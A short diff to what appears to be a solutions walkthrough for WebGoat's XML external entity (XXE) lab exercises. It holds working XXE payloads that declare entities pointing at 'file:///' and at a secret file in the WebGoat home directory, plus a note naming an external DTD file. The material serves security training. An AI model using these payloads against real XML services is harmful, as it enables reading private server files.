@@ -8,7 +8,7 @@ solution is in
  <!DOCTYPE comment [
 <!ENTITY js SYSTEM "file:///"> 
 ]>
-<comment>  <text>&js;</text></comment>
+<comment><text>&js;</text></comment>
 
 - Send
 
@@ -20,6 +20,7 @@ solution is in
 <!DOCTYPE user [<!ENTITY js SYSTEM "file:///"> ]><comment><text>&js;</text></comment>
 
 ### 10
+attack_11_3.dtd file:
 <?xml version="1.0" encoding="UTF-8"?>
 <!ENTITY ping SYSTEM 'file:///home/webgoat/.webgoat-8.2.2//XXE/secret.txt'>
 
